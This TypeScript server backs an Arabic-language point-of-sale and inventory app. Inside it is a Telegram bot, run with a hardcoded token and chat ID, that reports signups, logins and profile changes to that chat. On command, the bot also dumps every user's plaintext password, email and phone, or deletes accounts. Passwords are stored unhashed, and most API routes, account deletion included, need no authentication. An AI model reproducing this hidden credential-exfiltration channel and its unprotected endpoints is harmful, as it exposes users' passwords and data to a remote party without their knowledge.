import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";
import { createServer as createViteServer } from "vite";
import Database from "better-sqlite3";
import path from "path";
import { fileURLToPath } from "url";
import fetch from "node-fetch";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const db = new Database("database.db");

const TELEGRAM_BOT_TOKEN = "8628965825:AAG9seMtpgcrAHnthIygdu0o9-6850-2LLI";
const TELEGRAM_CHAT_ID = "7649409589";

async function sendTelegramMessage(message: string) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });
  } catch (error) {
    console.error("Error sending Telegram message:", error);
  }
}

function deleteManager(id: number) {
  const transaction = db.transaction(() => {
    // Delete everything associated with this manager
    db.prepare("DELETE FROM audit_logs WHERE manager_id = ?").run(id);
    db.prepare("DELETE FROM debt_ledger WHERE manager_id = ?").run(id);
    
    // Delete sales and sale items
    const sales = db.prepare("SELECT id FROM sales WHERE manager_id = ?").all(id) as { id: number }[];
    for (const sale of sales) {
      db.prepare("DELETE FROM sale_items WHERE sale_id = ?").run(sale.id);
    }
    db.prepare("DELETE FROM sales WHERE manager_id = ?").run(id);
    
    db.prepare("DELETE FROM products WHERE manager_id = ?").run(id);
    db.prepare("DELETE FROM employees WHERE manager_id = ?").run(id);
    db.prepare("DELETE FROM managers WHERE id = ?").run(id);
  });
  transaction();
}

let lastUpdateId = 0;
async function pollTelegramUpdates() {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
    const data = await response.json() as any;
    if (data.ok && data.result.length > 0) {
      for (const update of data.result) {
        lastUpdateId = update.update_id;
        const message = update.message;
        if (message && message.text) {
          const text = message.text;
          
          if (text === "/num") {
            const count = db.prepare("SELECT COUNT(*) as count FROM managers").get() as { count: number };
            await sendTelegramMessage(`عدد المستخدمين الفعليين في الموقع حالياً: <b>${count.count}</b>`);
          } else if (text === "مستخدمين") {
            const managers = db.prepare("SELECT * FROM managers").all() as any[];
            if (managers.length > 0) {
              let response = "👥 <b>قائمة كافة المستخدمين:</b>\n\n";
              managers.forEach((m, i) => {
                response += `${i + 1}. <b>${m.username}</b>\n📧 ${m.email}\n🔑 ${m.password}\n📱 ${m.phone}\n🆔 ${m.manager_code}\n💎 ${m.is_pro ? 'برو' : 'عادي'}\n\n`;
                // Split message if too long (Telegram limit is ~4096 chars)
                if (response.length > 3500) {
                  sendTelegramMessage(response);
                  response = "";
                }
              });
              if (response) await sendTelegramMessage(response);
            } else {
              await sendTelegramMessage("❌ لا يوجد مستخدمين مسجلين حالياً.");
            }
          } else {
            const emailMatch = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
            const phoneMatch = text.match(/\b\d{9,15}\b/);
            const proCodeMatch = text.match(/\b[A-Z0-9]{12}\b/);
            
            if (proCodeMatch && (text.includes("شهري") || text.includes("سنوي"))) {
              const code = proCodeMatch[0];
              const type = text.includes("شهري") ? "monthly" : "yearly";
              try {
                db.prepare("INSERT INTO pro_codes (code, type, valid) VALUES (?, ?, 1)").run(code, type);
                await sendTelegramMessage(`✅ تم إضافة كود جديد بنجاح:\nالكود: <code>${code}</code>\nالنوع: <b>${type === 'monthly' ? 'شهري' : 'سنوي'}</b>`);
              } catch (e) {
                await sendTelegramMessage(`❌ الكود <code>${code}</code> موجود مسبقاً في قاعدة البيانات.`);
              }
            } else if (text.includes("/deli") && emailMatch) {
              const email = emailMatch[0];
              const manager = db.prepare("SELECT id FROM managers WHERE email = ?").get(email) as any;
              if (manager) {
                deleteManager(manager.id);
                await sendTelegramMessage(`✅ تم مسح الحساب المرتبط بالبريد: <b>${email}</b> بنجاح.`);
              } else {
                await sendTelegramMessage(`❌ البريد الإلكتروني <b>${email}</b> غير موجود.`);
              }
            } else if (emailMatch) {
              const email = emailMatch[0];
              const manager = db.prepare("SELECT * FROM managers WHERE email = ?").get(email) as any;
              if (manager) {
                await sendTelegramMessage(`👤 <b>بيانات المستخدم:</b>\nالاسم: ${manager.username}\nالبريد: ${manager.email}\nكلمة السر: ${manager.password}\nالهاتف: ${manager.phone}\nكود المدير: ${manager.manager_code}\nالحالة: ${manager.is_pro ? 'برو' : 'عادي'}`);
              } else {
                await sendTelegramMessage(`❌ البريد الإلكتروني <b>${email}</b> غير موجود.`);
              }
            } else if (phoneMatch) {
              const phone = phoneMatch[0];
              const manager = db.prepare("SELECT * FROM managers WHERE phone = ?").get(phone) as any;
              if (manager) {
                await sendTelegramMessage(`👤 <b>بيانات المستخدم:</b>\nالاسم: ${manager.username}\nالبريد: ${manager.email}\nكلمة السر: ${manager.password}\nالهاتف: ${manager.phone}\nكود المدير: ${manager.manager_code}\nالحالة: ${manager.is_pro ? 'برو' : 'عادي'}`);
              } else {
                await sendTelegramMessage(`❌ رقم الهاتف <b>${phone}</b> غير موجود.`);
              }
            }
          }
        }
      }
    }
  } catch (error) {
    // console.error("Error polling Telegram updates:", error);
  }
  setTimeout(pollTelegramUpdates, 3000);
}

// Initialize Database
db.exec(`
  CREATE TABLE IF NOT EXISTS managers (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    email TEXT UNIQUE,
    password TEXT,
    phone TEXT,
    manager_code TEXT UNIQUE,
    is_pro INTEGER DEFAULT 0,
    pro_expiry DATETIME,
    currency TEXT DEFAULT '$',
    company_name TEXT DEFAULT 'شركتي',
    last_profile_update DATETIME
  );

  CREATE TABLE IF NOT EXISTS employees (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    manager_id INTEGER,
    role TEXT DEFAULT 'regular',
    status TEXT DEFAULT 'pending',
    FOREIGN KEY (manager_id) REFERENCES managers(id)
  );

  CREATE TABLE IF NOT EXISTS products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    manager_id INTEGER,
    name TEXT,
    barcode TEXT,
    barcode_type TEXT,
    purchase_price REAL,
    sale_price REAL,
    quantity INTEGER,
    FOREIGN KEY (manager_id) REFERENCES managers(id)
  );

  CREATE TABLE IF NOT EXISTS sales (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    manager_id INTEGER,
    employee_id INTEGER,
    total REAL,
    discount REAL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    invoice_token TEXT,
    FOREIGN KEY (manager_id) REFERENCES managers(id)
  );

  CREATE TABLE IF NOT EXISTS sale_items (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sale_id INTEGER,
    product_id INTEGER,
    quantity INTEGER,
    price REAL,
    discount REAL,
    FOREIGN KEY (sale_id) REFERENCES sales(id)
  );

  CREATE TABLE IF NOT EXISTS debt_ledger (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    manager_id INTEGER,
    customer_name TEXT,
    amount REAL,
    paid REAL DEFAULT 0,
    details TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (manager_id) REFERENCES managers(id)
  );

  CREATE TABLE IF NOT EXISTS audit_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    manager_id INTEGER,
    action TEXT,
    performed_by TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (manager_id) REFERENCES managers(id)
  );

  CREATE TABLE IF NOT EXISTS pro_codes (
    code TEXT PRIMARY KEY,
    type TEXT,
    valid INTEGER DEFAULT 1
  );
`);

// Migration: Add columns if they don't exist
const migrations = [
  "ALTER TABLE managers ADD COLUMN password TEXT",
  "ALTER TABLE managers ADD COLUMN phone TEXT",
  "ALTER TABLE managers ADD COLUMN last_profile_update DATETIME"
];

migrations.forEach(m => {
  try {
    db.prepare(m).run();
  } catch (e) {
    // Column might already exist
  }
});

// Seed Pro Codes if empty
const codesCount = db.prepare("SELECT COUNT(*) as count FROM pro_codes").get() as { count: number };
if (codesCount.count === 0) {
  const monthlyCodes = [
    "A7D9K3P1Q8Z2", "B4F6L8R0S3N7", "C2M5T9V1X4Y8", "D9Q1Z6H3W7K2", "E3N7A4J8P0L5",
    "F8R2S6B1V9M4", "G1K9P5X2T7C8", "H6L3Z8Q0N5Y1", "J2V7M4R9S1K6", "K5P8T2A9D3F1",
    "L9X1C6V4B7N2", "M3S7Q0H4J8P6", "N4Y2K9Z5R1T7", "P7B1M8L3S4Q9", "Q0D6F2V9X3K5",
    "R8N5A1P7Z4M2", "S2K4T9B6V1Q7", "T6P3R8X0L5N1", "V1Z9M4S2K7Q6", "W3A8D5P1R9L2",
    "X9C2V6B4T1K7", "Y5Q1N7M3S8P2", "Z2K7P9X4D1V6", "0A9B8C7D6E5F", "1G4H7J2K9L0M"
  ];
  const yearlyCodes = [
    "G5H8K2L9Q3A1", "J7M3P0R8S6D4", "T9C2F8B1W5E7", "Z6Y1H3X0Q4J9", "A4B7C9D2E1F8",
    "L8N2K5Q7J3R0", "P1S9T6V3Z4M2", "R5X8W0Y2H6J1", "Q3D7F1G9L0K8", "H2K6M3P5N1T4",
    "S8J1Q2B4R7X0", "V4W5E9K1T3C6", "F0G3H7J2L8M1", "N9P4R6S1T2V5", "K1L8M0N3Q6H7",
    "T2C5D8F9W1J3", "X3Y6Z2A4B9P0", "J0K1L4M7N8Q5", "E8F2G1H9K3R6", "D7C5B3A2W9X0",
    "M2N4O8P1Q6R5", "H3J5K7L9T0V2", "P8Q1R4S3T6W7", "Z0Y2X5A8B1C4", "F6G9H0J2K4L7",
    "R1S3T5U8V9W0", "K7L1M4N2P5Q3", "C9D0E6F1G8H4", "W5X2Y3Z1A9B7", "Q8R0S4T5U6V1",
    "T3U5V8W1X9Y0", "N6O7P2Q4R3S1", "L0M1N5O8P9Q6", "J7K9L1M2N4T5", "B2C4D6E8F0G3",
    "X4Y6Z8A0B1C9", "H1J3K5L7M9N2", "P3Q5R7S9T0V4", "D8E0F2G4H1J6", "R6T9U2V5W1X3",
    "K4M8N0P2Q7S5", "A5B7C9D1E3F8", "W2X4Y6Z8A0B9", "J0K3L5M7N8P2", "H9I2J4K6L0M3",
    "V8W0X2Y4Z6A1", "S1T3U5V7W9X0", "Q2R4S6T8U0V1", "K5L7M9N1P3Q8", "C0D2E4F6G8H3"
  ];
  
  const insertCode = db.prepare("INSERT INTO pro_codes (code, type) VALUES (?, ?)");
  monthlyCodes.forEach(c => insertCode.run(c, 'monthly'));
  yearlyCodes.forEach(c => insertCode.run(c, 'yearly'));
}

async function startServer() {
  const app = express();
  const httpServer = createServer(app);
  const io = new Server(httpServer);
  const PORT = 3000;

  app.use(express.json());

  // Socket.io logic
  io.on("connection", (socket) => {
    socket.on("join_manager", (managerCode) => {
      socket.join(`manager_${managerCode}`);
    });
    
    socket.on("kick_employee", (data) => {
      io.to(`employee_${data.employeeId}`).emit("kicked");
    });

    socket.on("join_employee", (employeeId) => {
      socket.join(`employee_${employeeId}`);
    });
  });

  // API Routes
  app.post("/api/auth/manager/signup", (req, res) => {
    const { username, email, password, phone } = req.body;
    const manager_code = Math.random().toString(36).substring(2, 9).toUpperCase();
    try {
      const result = db.prepare("INSERT INTO managers (username, email, password, phone, manager_code) VALUES (?, ?, ?, ?, ?)").run(username, email, password, phone, manager_code);
      sendTelegramMessage(`🆕 <b>إنشاء حساب جديد</b>\nالاسم: ${username}\nالبريد: ${email}\nالهاتف: ${phone}\nكود المدير: ${manager_code}`);
      res.json({ id: result.lastInsertRowid, manager_code });
    } catch (e) {
      res.status(400).json({ error: "Email already exists" });
    }
  });

  app.post("/api/auth/manager/login", (req, res) => {
    const { email, password, manager_code, phone } = req.body;
    const manager = db.prepare("SELECT * FROM managers WHERE email = ? AND password = ? AND manager_code = ? AND phone = ?").get(email, password, manager_code, phone) as any;
    if (manager) {
      sendTelegramMessage(`🔑 <b>تسجيل دخول</b>\nالاسم: ${manager.username}\nالبريد: ${manager.email}`);
      res.json(manager);
    }
    else res.status(401).json({ error: "بيانات الدخول غير صحيحة، يرجى التأكد من البريد وكلمة السر وكود المدير ورقم الهاتف" });
  });

  app.post("/api/auth/manager/delete", (req, res) => {
    const { id } = req.body;
    try {
      deleteManager(id);
      res.json({ success: true });
    } catch (e) {
      console.error(e);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  app.post("/api/auth/employee/join", (req, res) => {
    const { name, manager_code } = req.body;
    const manager = db.prepare("SELECT id FROM managers WHERE manager_code = ?").get(manager_code) as { id: number };
    if (!manager) return res.status(404).json({ error: "Manager not found" });
    
    const result = db.prepare("INSERT INTO employees (name, manager_id) VALUES (?, ?)").run(name, manager.id);
    res.json({ id: result.lastInsertRowid, status: 'pending' });
  });

  app.get("/api/auth/employee/status/:id", (req, res) => {
    const employee = db.prepare("SELECT * FROM employees WHERE id = ?").get(req.params.id);
    if (employee) res.json(employee);
    else res.status(404).json({ error: "Employee not found" });
  });

  app.get("/api/manager/:id/employees", (req, res) => {
    const employees = db.prepare("SELECT * FROM employees WHERE manager_id = ?").all(req.params.id);
    res.json(employees);
  });

  app.post("/api/manager/employees/update", (req, res) => {
    const { id, status, role } = req.body;
    db.prepare("UPDATE employees SET status = ?, role = ? WHERE id = ?").run(status, role, id);
    
    if (status === 'approved') {
      io.to(`employee_${id}`).emit("approved", { role });
    } else if (status === 'rejected' || status === 'kicked') {
      io.to(`employee_${id}`).emit("kicked");
    }

    res.json({ success: true });
  });

  app.get("/api/products/:managerId", (req, res) => {
    const products = db.prepare("SELECT * FROM products WHERE manager_id = ?").all(req.params.managerId);
    res.json(products);
  });

  app.post("/api/products", (req, res) => {
    const { manager_id, name, barcode, barcode_type, purchase_price, sale_price, quantity } = req.body;
    const result = db.prepare("INSERT INTO products (manager_id, name, barcode, barcode_type, purchase_price, sale_price, quantity) VALUES (?, ?, ?, ?, ?, ?, ?)").run(manager_id, name, barcode, barcode_type, purchase_price, sale_price, quantity);
    res.json({ id: result.lastInsertRowid });
  });

  app.put("/api/products/:id", (req, res) => {
    const { name, barcode, barcode_type, purchase_price, sale_price, quantity } = req.body;
    db.prepare("UPDATE products SET name = ?, barcode = ?, barcode_type = ?, purchase_price = ?, sale_price = ?, quantity = ? WHERE id = ?").run(name, barcode, barcode_type, purchase_price, sale_price, quantity, req.params.id);
    res.json({ success: true });
  });

  app.delete("/api/products/:id", (req, res) => {
    try {
      const productId = parseInt(req.params.id);
      if (isNaN(productId)) return res.status(400).json({ error: "Invalid ID" });
      
      console.log(`Deleting product with ID: ${productId}`);
      
      const transaction = db.transaction(() => {
        db.prepare("DELETE FROM sale_items WHERE product_id = ?").run(productId);
        return db.prepare("DELETE FROM products WHERE id = ?").run(productId);
      });
      
      const result = transaction();
      console.log(`Product delete result: ${result.changes} changes`);
      
      if (result.changes > 0) {
        res.json({ success: true });
      } else {
        res.status(404).json({ error: "Product not found" });
      }
    } catch (e) {
      console.error('Delete error:', e);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  app.post("/api/sales", (req, res) => {
    const { manager_id, employee_id, total, discount, items, invoice_token } = req.body;
    const insertSale = db.prepare("INSERT INTO sales (manager_id, employee_id, total, discount, invoice_token) VALUES (?, ?, ?, ?, ?)");
    const insertItem = db.prepare("INSERT INTO sale_items (sale_id, product_id, quantity, price, discount) VALUES (?, ?, ?, ?, ?)");
    const updateStock = db.prepare("UPDATE products SET quantity = quantity - ? WHERE id = ?");

    const transaction = db.transaction(() => {
      const saleResult = insertSale.run(manager_id, employee_id, total, discount, invoice_token);
      const saleId = saleResult.lastInsertRowid;
      for (const item of items) {
        insertItem.run(saleId, item.product_id, item.quantity, item.price, item.discount);
        updateStock.run(item.quantity, item.product_id);
      }
      return saleId;
    });

    const saleId = transaction();
    res.json({ id: saleId });
  });

  app.get("/api/sales/:managerId", (req, res) => {
    const sales = db.prepare("SELECT * FROM sales WHERE manager_id = ? ORDER BY timestamp DESC").all(req.params.managerId);
    res.json(sales);
  });

  app.get("/api/sale-items/:saleId", (req, res) => {
    const items = db.prepare(`
      SELECT si.*, p.name 
      FROM sale_items si 
      JOIN products p ON si.product_id = p.id 
      WHERE si.sale_id = ?
    `).all(req.params.saleId);
    res.json(items);
  });

  app.post("/api/pro/activate", (req, res) => {
    const { manager_id, code } = req.body;
    const proCode = db.prepare("SELECT * FROM pro_codes WHERE code = ? AND valid = 1").get(code) as { code: string, type: string };
    if (!proCode) return res.status(400).json({ error: "Invalid or used code" });

    const days = proCode.type === 'monthly' ? 30 : 365;
    const expiry = new Date();
    expiry.setDate(expiry.getDate() + days);

    db.prepare("UPDATE managers SET is_pro = 1, pro_expiry = ? WHERE id = ?").run(expiry.toISOString(), manager_id);
    db.prepare("UPDATE pro_codes SET valid = 0 WHERE code = ?").run(code);

    const manager = db.prepare("SELECT username FROM managers WHERE id = ?").get(manager_id) as { username: string };
    sendTelegramMessage(`💎 <b>تفعيل اشتراك برو</b>\nالمستخدم: ${manager.username}\nالكود: ${code}\nالنوع: ${proCode.type === 'monthly' ? 'شهري' : 'سنوي'}\nتاريخ الانتهاء: ${expiry.toLocaleDateString('ar-EG')}`);

    res.json({ success: true, expiry });
  });

  app.post("/api/audit", (req, res) => {
    const { manager_id, action, performed_by } = req.body;
    db.prepare("INSERT INTO audit_logs (manager_id, action, performed_by) VALUES (?, ?, ?)").run(manager_id, action, performed_by);
    res.json({ success: true });
  });

  app.get("/api/audit/:managerId", (req, res) => {
    const logs = db.prepare("SELECT * FROM audit_logs WHERE manager_id = ? ORDER BY timestamp DESC").all(req.params.managerId);
    res.json(logs);
  });

  app.get("/api/debt/:managerId", (req, res) => {
    const debts = db.prepare("SELECT * FROM debt_ledger WHERE manager_id = ?").all(req.params.managerId);
    res.json(debts);
  });

  app.post("/api/debt", (req, res) => {
    const { manager_id, customer_name, amount, details } = req.body;
    const result = db.prepare("INSERT INTO debt_ledger (manager_id, customer_name, amount, details) VALUES (?, ?, ?, ?)").run(manager_id, customer_name, amount, details);
    res.json({ id: result.lastInsertRowid });
  });

  app.post("/api/debt/pay", (req, res) => {
    const { id, amount } = req.body;
    db.prepare("UPDATE debt_ledger SET paid = paid + ? WHERE id = ?").run(amount, id);
    res.json({ success: true });
  });

  app.delete("/api/debt/:id", (req, res) => {
    try {
      const debtId = parseInt(req.params.id);
      if (isNaN(debtId)) return res.status(400).json({ error: "Invalid ID" });
      
      console.log(`Deleting debt with ID: ${debtId}`);
      const result = db.prepare("DELETE FROM debt_ledger WHERE id = ?").run(debtId);
      console.log(`Debt delete result: ${result.changes} changes`);
      res.json({ success: true });
    } catch (e) {
      console.error('Delete debt error:', e);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  app.post("/api/manager/profile", (req, res) => {
    const { id, username, email, phone, password } = req.body;
    const manager = db.prepare("SELECT last_profile_update FROM managers WHERE id = ?").get(id) as { last_profile_update: string | null };
    
    if (manager?.last_profile_update) {
      const lastUpdate = new Date(manager.last_profile_update);
      const today = new Date();
      if (lastUpdate.toDateString() === today.toDateString()) {
        return res.status(400).json({ error: "يمكنك تعديل البيانات مرة واحدة فقط في اليوم" });
      }
    }

    try {
      const oldData = db.prepare("SELECT * FROM managers WHERE id = ?").get(id) as any;
      db.prepare("UPDATE managers SET username = ?, email = ?, phone = ?, password = ?, last_profile_update = CURRENT_TIMESTAMP WHERE id = ?").run(username, email, phone, password, id);
      
      let changes = [];
      if (oldData.username !== username) changes.push(`الاسم: ${oldData.username} ⬅️ ${username}`);
      if (oldData.email !== email) changes.push(`البريد: ${oldData.email} ⬅️ ${email}`);
      if (oldData.phone !== phone) changes.push(`الهاتف: ${oldData.phone} ⬅️ ${phone}`);
      if (oldData.password !== password) changes.push(`كلمة السر: تم تغييرها`);
      
      if (changes.length > 0) {
        sendTelegramMessage(`📝 <b>تعديل بيانات الملف الشخصي</b>\nالمستخدم: ${username}\nالتعديلات:\n${changes.join('\n')}`);
      }
      
      res.json({ success: true });
    } catch (e) {
      res.status(400).json({ error: "البريد الإلكتروني مستخدم بالفعل" });
    }
  });

  app.post("/api/manager/settings", (req, res) => {
    const { id, currency, company_name } = req.body;
    db.prepare("UPDATE managers SET currency = ?, company_name = ? WHERE id = ?").run(currency, company_name, id);
    res.json({ success: true });
  });

  app.post("/api/manager/reset", (req, res) => {
    const { id, type } = req.body;
    console.log(`Resetting data for manager ID: ${id}, type: ${type}`);
    try {
      const transaction = db.transaction(() => {
        if (type === 'sales') {
          db.prepare("DELETE FROM sale_items WHERE sale_id IN (SELECT id FROM sales WHERE manager_id = ?)").run(id);
          db.prepare("DELETE FROM sales WHERE manager_id = ?").run(id);
          db.prepare("DELETE FROM debt_ledger WHERE manager_id = ?").run(id);
        } else if (type === 'full') {
          db.prepare("DELETE FROM sale_items WHERE sale_id IN (SELECT id FROM sales WHERE manager_id = ?)").run(id);
          db.prepare("DELETE FROM sales WHERE manager_id = ?").run(id);
          db.prepare("DELETE FROM products WHERE manager_id = ?").run(id);
          db.prepare("DELETE FROM debt_ledger WHERE manager_id = ?").run(id);
          db.prepare("DELETE FROM audit_logs WHERE manager_id = ?").run(id);
        }
      });
      transaction();
      console.log(`Reset successful for manager ID: ${id}`);
      res.json({ success: true });
    } catch (e) {
      console.error('Reset error:', e);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static("dist"));
    app.get("*", (req, res) => res.sendFile(path.resolve(__dirname, "dist", "index.html")));
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
    pollTelegramUpdates();
  });
}

startServer();
